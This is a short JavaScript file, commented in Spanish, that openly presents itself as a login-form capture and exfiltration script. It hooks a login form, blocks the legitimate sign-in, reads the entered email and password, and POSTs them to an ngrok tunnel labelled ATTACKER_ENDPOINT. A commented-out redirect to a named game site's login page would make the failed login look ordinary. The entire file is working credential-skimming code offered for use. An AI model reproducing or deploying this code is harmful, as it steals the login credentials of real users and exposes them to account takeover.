// =========================================================================
// SCRIPT DE CAPTURA DE FORMULARIO Y EXFILTRACIÓN DE DATOS REMOTA (NGROK/NODEJS)
// =========================================================================
window.addEventListener('load', function() {

    var form = document.getElementById('user_form_login'); 
    var emailInputId = 'email_field'; 
    var passwordInputId = 'password';

    // *** ¡CORREGIDO! Tu URL de Ngrok + el endpoint /capture-login ***
    const ATTACKER_ENDPOINT = 'https://justa-overscrupulous-succeedingly.ngrok-free.dev/capture-login'; 

    /**
     * Función que envía los datos capturados al servidor Node.js a través del túnel Ngrok.
     */
    function sendDataToServer(email, password) {
        const data = {
            email: email,
            password: password
        };

        // Envía la petición POST al servidor a través de Ngrok
        fetch(ATTACKER_ENDPOINT, {
            method: 'POST', 
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data) 
        })
        .then(response => {
            console.log('Datos enviados. Respuesta del servidor Node.js:', response.status);
            
            // Opcional: Redirige para simular que el login falló
            // window.location.href = 'https://www.warmerise.com/login';
        })
        .catch(error => {
            console.error('Error al enviar los datos (¿Ngrok caído o servidor cerrado?):', error);
        });
    }

    if (form) {
        form.addEventListener('submit', function(event) {
            
            // Previene que la página haga la acción legítima (iniciar sesión)
            event.preventDefault(); 

            // Captura los valores
            var emailInput = document.getElementById(emailInputId);
            var passwordInput = document.getElementById(passwordInputId);

            var email = emailInput ? emailInput.value : 'N/A';
            var password = passwordInput ? passwordInput.value : 'N/A';

            // Ejecuta la exfiltración remota
            sendDataToServer(email, password);

        }, true); 

    } else {
        console.warn('El formulario no fue encontrado.');
    }
});